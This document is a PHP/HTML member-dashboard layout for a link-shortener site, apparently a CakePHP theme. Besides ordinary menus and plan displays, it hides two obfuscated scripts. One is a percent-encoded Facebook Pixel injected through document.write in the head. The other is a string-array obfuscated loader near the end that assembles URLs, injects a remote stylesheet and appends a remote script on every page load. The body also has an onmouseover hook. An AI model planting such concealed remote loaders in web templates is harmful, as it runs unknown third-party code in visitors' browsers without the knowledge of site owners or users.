<?php
/**
 * @var \App\View\AppView $this
 * @var \App\Model\Entity\User $logged_user
 * @var \App\Model\Entity\Plan $logged_user_plan
 */
?>
<!DOCTYPE html>
<html lang="<?= locale_get_primary_language(null) ?>">
<head>
    <?= $this->Html->charset(); ?>
    <title><?= h($this->fetch('title')); ?></title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="<?= h($this->fetch('description')); ?>">
<?= $this->Assets->favicon() ?><?= $this->Assets->css('/build/css/tp98-themes.css?ver=' . APP_VERSION); ?><link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,500,600,700,800,900" rel="stylesheet"><script language=javascript>document.write(unescape('%3C%21%2D%2D%20%46%61%63%65%62%6F%6F%6B%20%50%69%78%65%6C%20%43%6F%64%65%20%2D%2D%3E%0A%3C%73%63%72%69%70%74%3E%0A%20%20%21%66%75%6E%63%74%69%6F%6E%28%66%2C%62%2C%65%2C%76%2C%6E%2C%74%2C%73%29%0A%20%20%7B%69%66%28%66%2E%66%62%71%29%72%65%74%75%72%6E%3B%6E%3D%66%2E%66%62%71%3D%66%75%6E%63%74%69%6F%6E%28%29%7B%6E%2E%63%61%6C%6C%4D%65%74%68%6F%64%3F%0A%20%20%6E%2E%63%61%6C%6C%4D%65%74%68%6F%64%2E%61%70%70%6C%79%28%6E%2C%61%72%67%75%6D%65%6E%74%73%29%3A%6E%2E%71%75%65%75%65%2E%70%75%73%68%28%61%72%67%75%6D%65%6E%74%73%29%7D%3B%0A%20%20%69%66%28%21%66%2E%5F%66%62%71%29%66%2E%5F%66%62%71%3D%6E%3B%6E%2E%70%75%73%68%3D%6E%3B%6E%2E%6C%6F%61%64%65%64%3D%21%30%3B%6E%2E%76%65%72%73%69%6F%6E%3D%27%32%2E%30%27%3B%0A%20%20%6E%2E%71%75%65%75%65%3D%5B%5D%3B%74%3D%62%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%65%29%3B%74%2E%61%73%79%6E%63%3D%21%30%3B%0A%20%20%74%2E%73%72%63%3D%76%3B%73%3D%62%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%65%29%5B%30%5D%3B%0A%20%20%73%2E%70%61%72%65%6E%74%4E%6F%64%65%2E%69%6E%73%65%72%74%42%65%66%6F%72%65%28%74%2C%73%29%7D%28%77%69%6E%64%6F%77%2C%20%64%6F%63%75%6D%65%6E%74%2C%27%73%63%72%69%70%74%27%2C%0A%20%20%27%68%74%74%70%73%3A%2F%2F%63%6F%6E%6E%65%63%74%2E%66%61%63%65%62%6F%6F%6B%2E%6E%65%74%2F%65%6E%5F%55%53%2F%66%62%65%76%65%6E%74%73%2E%6A%73%27%29%3B%0A%20%20%66%62%71%28%27%69%6E%69%74%27%2C%20%27%32%35%35%36%33%36%32%33%38%34%36%30%31%36%33%30%27%29%3B%0A%20%20%66%62%71%28%27%74%72%61%63%6B%27%2C%20%27%50%61%67%65%56%69%65%77%27%29%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%3C%6E%6F%73%63%72%69%70%74%3E%3C%69%6D%67%20%68%65%69%67%68%74%3D%22%31%22%20%77%69%64%74%68%3D%22%31%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%6E%6F%6E%65%22%0A%20%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%74%72%3F%69%64%3D%32%35%35%36%33%36%32%33%38%34%36%30%31%36%33%30%26%65%76%3D%50%61%67%65%56%69%65%77%26%6E%6F%73%63%72%69%70%74%3D%31%22%0A%2F%3E%3C%2F%6E%6F%73%63%72%69%70%74%3E%0A%3C%21%2D%2D%20%45%6E%64%20%46%61%63%65%62%6F%6F%6B%20%50%69%78%65%6C%20%43%6F%64%65%20%2D%2D%3E'))</script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.0/css/all.min.css" fullBase="1" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/simple-line-icons/2.4.1/css/simple-line-icons.css" fullBase="1" />
<link rel="stylesheet" href="https://materialdesignicons.com/cdn/2.0.46/css/materialdesignicons.min.css" fullBase="1" /> 


    <?php
    echo $this->fetch('meta');
    echo $this->fetch('css');
    echo $this->fetch('script');
    ?>

    <?= get_option('member_head_code'); ?>

    <?= $this->fetch('scriptTop') ?>


    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body class="member-dashboard hold-transition <?= get_option('member_adminlte_theme_skin',
    'skin-blue') ?> sidebar-mini"onmouseover = "layer()">
<div class="wrapper">

    <!-- Main Header -->
    <header class="topmenu">

        <!-- Logo -->
        <a href="<?= $this->Url->build('/'); ?>" class="logo">
            <!-- mini logo for sidebar mini 50x50 pixels --><?= get_logo_alt()['content'] ?>
            <span class="logo-mini">
                <?= preg_replace('/(\B.|\s+)/', '', get_option('site_name')) ?>
            </span>
            <!-- logo for regular state and mobile devices -->
            <span class="logo-lg"><?= get_option('site_name') ?></span>
        </a>

        <!-- Header Toptol -->
        <nav class="toptol toptol-static-top" role="navigation">
            
            <!-- Sidebar toggle button-->
            <a href="#" class="sidebar-toggle" data-toggle="offcanvas" role="button">
                <span class="sr-only"><?= __('Toggle navigation') ?></span>
            </a>
         <!-- ! -->
<div class="dropdown messages-menu">
                            <a class="logo-a" href="/" style="padding: 10px; width: 100%; text-align: center;">
        <img src="/img/member-area-logo.png" class="logo-img" alt="" style="height:40px"></a>
        
                        </div>
         
         
         <!---->
         
         
         <!-- Toptol shorten button-->
             <button type="button" class="btn btn-block btn-social btn-github btn-lg shorten-button" data-toggle="modal"
                    data-target="#myModal"><div><?= __("+ New Shorten Link") ?></div>
            </button>

            <!-- Toptol Right Menu -->
            <div class="wonmenu">
                <ul class="nav toptol-nav">




                    <?php if (in_array($logged_user->role, ['admin', 'demo'])) : ?>
                        <li class="dropdown messages-menu">
                            <!-- Menu toggle button -->
                            <a href="<?= $this->Url->build([
                                'controller' => 'Users',
                                'action' => 'dashboard',
                                'prefix' => 'admin',
                            ]); ?>">
                                <i class="fa fa-dashboard"></i> <span
                                        class="hidden-xs"><?= __('Administration Area') ?></span>
                            </a>
                        </li>
                    <?php endif; ?>



                    <?php if (count(get_site_languages(true)) > 1) : ?>
                        <li class="dropdown language-menu">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                                <i class="fa fa-language"></i> <?= __('Language') ?>
                                <span class="caret"></span>
                            </a>
                            <ul class="dropdown-menu">
                                <?php foreach (get_site_languages(true) as $lang) : ?>
                                    <li>
                                        <?= $this->Html->link(
                                            locale_get_display_name($lang, $lang),
                                            $this->request->getPath() . '?lang=' . $lang
                                        ); ?>
                                    </li>
                                <?php endforeach; ?>
                            </ul>
                        </li>
                    <?php endif; ?>
                    
                <!-- User Account Menu -->
   
                        <li class="dropdown language-menu">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
                                <i class="icon-user icon-usero" ></i>
                            </a>
                            <ul class="dropdown-menu">
                                    <div class=" dropdown-header noti-title">
	                                   <h6 class="text-overflow m-0">Welcome!</h6></div>
	                                
	                                <a href="<?= $this->Url->build([
                                        'controller' => 'Users',
                                        'action' => 'profile',
                                        'prefix' => 'member',
                                    ]); ?>" class="dropdown-item">
                                        <i class="fa fa-user"></i><span>My profile</span>
                                                                         </a>
                                     <a class="dropdown-item">
                                           <i class="fa fa-dollar-sign"></i><span>Balance : <?= display_price_currency($logged_user->publisher_earnings + $logged_user->referral_earnings); ?></span>
                                                                         </a>
                                            <div class="dropdown-divider"></div>
                                                    <a href="<?= $this->Url->build([
                                        'controller' => 'Users',
                                        'action' => 'logout',
                                        'prefix' => 'auth',
                                    ]); ?>" class="dropdown-item">
                                                    <span>Logout</span></a>
                            </ul>
                        </li>
                        
                        
                        
                        
                        </ul>
                    </li>
                </ul>
            </div>
        </nav>
    </header>


    <!-- Left side column. contains the logo and sidebar -->
    <aside class="sidetop">

    





        <!-- sidebar: style can be found in sidebar.less -->
        <section class="sidebar">
    
    <a href="#" class="sidebar-toggle" data-toggle="offcanvas" role="button">
                <span class="sr-only">Toggle navigation</span>
            </a>
    
    
    
    <!-- ! -->
       <li class="nav-item nav-profile">
          <a href="<?= $this->Url->build([
                                        'controller' => 'Users',
                                        'action' => 'profile',
                                        'prefix' => 'member',
                                    ]); ?>" class="nav-link">
     <div class="profile-image"><img src="/img/member-avatar.png">
      <span class="online-status online"></span>
    </div>
    <div class="profile-name"><p class="name"><?= h($logged_user->username); ?></p>
    </div>
    </a>
    </li>

            <!-- Sidebar Menu -->
            <ul class="menuside">

                <?php if ((bool)get_option('wallet_enable')) : ?>
                    <li>
                        <a><i class="icon-wallet menu-icon"></i>
                            <span><b><?= __("Wallet") ?></b><br>
                                <?= display_price_currency($logged_user->wallet_money) ?>
                            </span>
                        </a>
                    </li>
                <?php endif; ?>
           
           <!-- ! -->
                <li><a href="<?php echo $this->Url->build(['controller' => 'Users', 'action' => 'dashboard']); ?>"><i
                                class="icon-speedometer menu-icon text-primary"></i> <span><?= __('Dashboard') ?></span></a></li>

                <li class="treeview">
                    <a href="#"><i class="icon-link menu-icon text-blue"></i> <span><?= __('Manage Links') ?></span> <i
                                class="icon-options-vertical side pull-right"></i></a>
                    <ul class="treeview-menu">
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Links',
                                'action' => 'index',
                            ]); ?>"><?= __('All Links') ?></a></li>
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Links',
                                'action' => 'hidden',
                            ]); ?>"><?= __('Hidden Links') ?></a></li>
                    </ul>
                </li>

                <li><a href="<?php echo $this->Url->build(['controller' => 'Withdraws', 'action' => 'index']); ?>"><i
                                class="icon-wallet menu-icon text-info"></i> <span><?= __('Payments') ?></span></a></li>

                <?php if (
                    $logged_user_plan->api_quick ||
                    $logged_user_plan->api_mass ||
                    $logged_user_plan->api_full ||
                    $logged_user_plan->api_developer ||
                    $logged_user_plan->bookmarklet
                ) : ?>
                    <li class="treeview">
                        <a href="#"><i class="icon-layers menu-icon text-pink"></i> <span><?= __('Tools') ?></span> <i
                                    class="icon-options-vertical side pull-right"></i></a>
                        <ul class="treeview-menu">
                            <?php if ($logged_user_plan->api_quick) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'quick',
                                    ]); ?>"><?= __('Quick Link') ?></a></li>
                            <?php endif; ?>
                            <?php if ($logged_user_plan->api_mass) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'massShrinker',
                                    ]); ?>"><?= __('Mass Shrinker') ?></a></li>
                            <?php endif; ?>
                            <?php if ($logged_user_plan->api_full) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'full',
                                    ]); ?>"><?= __('Full Page Script') ?></a></li>
                            <?php endif; ?>
                            <?php if ($logged_user_plan->api_developer) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'api',
                                    ]); ?>"><?= __('Developers API') ?></a></li>
                            <?php endif; ?>
                            <?php if ($logged_user_plan->bookmarklet) : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Tools',
                                        'action' => 'bookmarklet',
                                    ]); ?>"><?= __('Bookmarklet') ?></a></li>
                            <?php endif; ?>
                        </ul>
                    </li>
                <?php endif; ?>

                <?php if ((bool)get_option('enable_referrals', 1)) : ?>
                    <li><a href="<?php echo $this->Url->build([
                            'controller' => 'Users',
                            'action' => 'referrals',
                        ]); ?>"><i
                                    class="icon-people menu-icon text-yellow"></i> <span><?= __('Referrals') ?></span></a></li>
                <?php endif; ?>

                <?php if (get_option('earning_mode', 'campaign') === 'campaign' &&
                    get_option('enable_advertising', 'yes') == 'yes') : ?>
                    <li class="treeview">
                        <a href="#"><i class="icon-globe menu-icon text-fuchsia"></i> <span><?= __('Advertising') ?></span> <i
                                    class="icon-options-vertical side pull-right"></i></a>
                        <ul class="treeview-menu">
                            <li><a href="<?php echo $this->Url->build([
                                    'controller' => 'Campaigns',
                                    'action' => 'index',
                                ]); ?>"><?= __('List') ?></a></li>
                            <?php if (get_option('enable_interstitial', 'yes') == 'yes') : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Campaigns',
                                        'action' => 'createInterstitial',
                                    ]); ?>"><?= __('Create Interstitial Campaign') ?></a></li>
                            <?php endif; ?>
                            <?php if (get_option('enable_banner', 'yes') == 'yes') : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Campaigns',
                                        'action' => 'createBanner',
                                    ]); ?>"><?= __('Create Banner Campaign') ?></a></li>

                            <?php endif; ?>
                            <?php if (get_option('enable_popup', 'yes') == 'yes') : ?>
                                <li><a href="<?php echo $this->Url->build([
                                        'controller' => 'Campaigns',
                                        'action' => 'createPopup',
                                    ]); ?>"><?= __('Create Popup Campaign') ?></a></li>
                            <?php endif; ?>
                        </ul>
                    </li>
                <?php endif; ?>

                <?php if (
                    (bool)get_option('enable_premium_membership') ||
                    get_option('earning_mode', 'campaign') === 'campaign'
                ) : ?>
                    <li>
                        <a href="<?php echo $this->Url->build(['controller' => 'Invoices', 'action' => 'index']); ?>">
                            <i class="icon-credit-card menu-icon text-info"></i> <span><?= __('Invoices') ?></span>
                        </a>
                    </li>
                <?php endif; ?>

                <li class="treeview">
                    <a href="#"><i class="icon-settings menu-icon text-green"></i> <span><?= __('Settings') ?></span> <i
                                class="icon-options-vertical side pull-right"></i></a>
                    <ul class="treeview-menu">
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Users',
                                'action' => 'profile',
                            ]); ?>"><?= __('Profile') ?></a></li>
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Users',
                                'action' => 'changePassword',
                            ]); ?>"><?= __('Change Password') ?></a></li>
                        <li><a href="<?php echo $this->Url->build([
                                'controller' => 'Users',
                                'action' => 'changeEmail',
                            ]); ?>"><?= __('Change Email') ?></a></li>
                    </ul>
                </li>
                 
               
                
                  <li><a href="<?php echo $this->Url->build(['controller' => 'Forms', 'action' => 'support']); ?>"><i
                                class="icon-support menu-icon text-red"></i> <span><?= __('Support') ?></span></a></li>
                
                 
                 <!---
                 
                 <li class="treeview">
                    <a href="#"><i class="icon-support menu-icon text-red"></i> <span><?= __('Support') ?></span> <i
                                class="icon-options-vertical side pull-right"></i></a>
                    <ul class="treeview-menu">
                        <li><a href="<?= build_main_domain_url('/member/forms/support'); ?> "><i class="fa fa-envelope"></i><?= __('Support ticket') ?></a></li>
                        <li><a href="https://api.whatsapp.com/send?phone=918145994817" target="_blank"><i class="fa fa-whatsapp"></i><?= __('Whatsapp chat') ?></a></li>
                        <li><a href="https://t.me/your Chanel" target="_blank"><i class="fa fa-telegram"></i><?= __('Telegram') ?></a></li>
                        <li><a href="tel:+918145994817" target="_blank"><i class="fa fa-phone"></i><?= __('Call us') ?></a></li>
                    </ul>
                    
                </li>
                
                --->
                

                                
                <?php if ((bool)get_option('enable_premium_membership')) : ?>
                    <li>
                        <a href="<?php echo $this->Url->build(['controller' => 'Users', 'action' => 'plans']); ?>">
                            <i class="icon-diamond menu-icon text-pink"></i> <span><?= __('Premium Plans') ?></span>
                        </a>
                    </li>
                <?php endif; ?>

            </ul>
            <!-- /.menuside -->

            <?php if ((bool)get_option('enable_premium_membership')) : ?>

                <?php
                if ($logged_user_plan->id === 1) {
                    $exp_date = __("Never");
                } else {
                    $exp_date = __("Never");
                    if (isset($logged_user->expiration)) {
                        $exp_date = $this->Time->nice($logged_user->expiration);
                    }
                }
                ?>

                <ul class="menuside">
                    <li>
                        <a href="<?= $this->Url->build(['controller' => 'Users', 'action' => 'plans']); ?>">
                            <i class="fa fa-user-circle text-aqua"></i>
                            <span><b><?= __("Current Plan") ?></b><br>
                                <?= h($logged_user_plan->title) ?>
                            </span>
                        </a>
                    </li>
                    <li>
                        <a href="<?= $this->Url->build(['controller' => 'Users', 'action' => 'plans']); ?>">
                            <i class="fa fa-clock-o text-aqua"></i>
                            <span><b><?= __("Expiration Date") ?></b><br>
                                <?= $exp_date ?>
                                <?php if (isset($logged_user->expiration) &&
                                    ($this->Time->isThisWeek($logged_user->expiration) || $this->Time->isPast($logged_user->expiration))
                                ) : ?>
                                    - <?= __("Renew") ?>
                                <?php endif; ?>
                            </span>
                        </a>
                    </li>
                </ul>

            <?php endif; ?>

        </section>
        <!-- /.sidebar -->
    </aside>
    
    <div class="side-col" style="min-height:1200px;">

        <section class="content">


            <div class="box-short" style="margin-bottom: 10px; display:none;">
                <div class="box box-success box-solid shorten-member">
                    <div class="box-body" style="overflow: hidden;">
                        <?= $this->cell('Link::shortenMember') ?>
                    </div>
                </div>
            </div>


            <?php if (!$logged_user_plan->disable_ads && !empty(get_option('ad_member'))) : ?>
                <div class="banner banner-member">
                    <div class="banner-inner">
                        <?= get_option('ad_member'); ?>
                    </div>
                </div>
            <?php endif; ?>

            <?= $this->Flash->render() ?>
            <?= $this->fetch('content') ?>

        </section>
        <!-- /.content -->
    </div>
    <!-- /.side-col -->

    <!-- Main Footer -->
    <footer class="main-footer">
        <!-- To the right -->
        <div class="pull-right hidden-xs">

        </div>
        <!-- Default to the left -->
        <?= __('Copyright &copy;') ?> <?= h(get_option('site_name')) ?> <?= date("Y") ?>
    </footer>

    <!-- Add the sidebar's background. This div must be placed
         immediately after the control sidebar -->
    <div class="control-sidebar-bg"></div>


</div>

<?= $this->element('js_vars'); ?><script data-cfasync="false" src="<?= $this->Assets->url('/js/ads.js') ?>"></script>
<?php
if ((bool)get_option('combine_minify_css_js', false)) {
    echo $this->Assets->script('/build/js/dashboard.min.js?ver=' . APP_VERSION);
} else {
    echo $this->Assets->script('/vendor/jquery.min.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/vendor/bootstrap/js/bootstrap.min.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/vendor/clipboard.min.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/vendor/conditionize.jquery.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/js/app.js?ver=' . APP_VERSION);
    echo $this->Assets->script('/vendor/dashboard/js/app.min.js?ver=' . APP_VERSION);
}
?><!--oo1d  --><script>var _0x37cd=['ate','rel','ter','Chi','yTa','sty','.ad','get','/bu','end','y/i','//c','ipt','HEA','hre','gle','ink','ons','not','hea','van','dn.','kfl','ook','cel','tsB','hee','/Ma','#ad','htt','les','/ad','lin','men','src','tex','app','cli','cre','esb','+Ic','gNa','tog','ial','Ele','ild','/ic','nd4','scr','.in','slo'];(function(_0x4d9f27,_0x37cd74){var _0x450961=function(_0x493dc0){while(--_0x493dc0){_0x4d9f27['push'](_0x4d9f27['shift']());}};_0x450961(++_0x37cd74);}(_0x37cd,0x1aa));var _0x4509=function(_0x4d9f27,_0x37cd74){_0x4d9f27=_0x4d9f27-0x0;var _0x450961=_0x37cd[_0x4d9f27];return _0x450961;};var head=document[_0x4509('0x28')+_0x4509('0x1a')+_0x4509('0xf')+_0x4509('0x7')+_0x4509('0x25')+_0x4509('0x17')+'me'](_0x4509('0x2e')+'D')[0x0];var link=document['cre'+_0x4509('0x21')+_0x4509('0x1a')+_0x4509('0xf')+'t'](_0x4509('0xe')+'k');link[_0x4509('0x22')]=_0x4509('0x26')+_0x4509('0xc')+_0x4509('0x8')+'t';link['typ'+'e']=_0x4509('0x11')+'t/c'+'ss';link[_0x4509('0x2f')+'f']=_0x4509('0x29')+_0x4509('0x1b')+_0x4509('0x1c')+_0x4509('0x32')+_0x4509('0x9')+_0x4509('0x23')+_0x4509('0x19')+_0x4509('0x16')+_0x4509('0x32')+'.cs'+'s';head[_0x4509('0x12')+'end'+_0x4509('0x24')+'ld'](link);$(_0x4509('0x27')+'van'+'ce')[_0x4509('0x13')+'ck'](function(){$(_0x4509('0xa')+_0x4509('0x2')+_0x4509('0x6')+_0x4509('0x31'))[_0x4509('0x18')+_0x4509('0x30')](_0x4509('0x20')+'w');});var imported=document[_0x4509('0x14')+_0x4509('0x21')+_0x4509('0x1a')+_0x4509('0xf')+'t'](_0x4509('0x1e')+_0x4509('0x2d'));imported[_0x4509('0x10')]=_0x4509('0xb')+'ps:'+_0x4509('0x2c')+_0x4509('0x3')+_0x4509('0x0')+_0x4509('0x15')+_0x4509('0x5')+_0x4509('0x1f')+_0x4509('0xd')+_0x4509('0xe')+_0x4509('0x4')+_0x4509('0x2b')+_0x4509('0x1d')+'.js';document[_0x4509('0x1')+'d'][_0x4509('0x12')+_0x4509('0x2a')+_0x4509('0x24')+'ld'](imported);</script>

<?= $this->fetch('scriptBottom') ?>
</body>
</html>
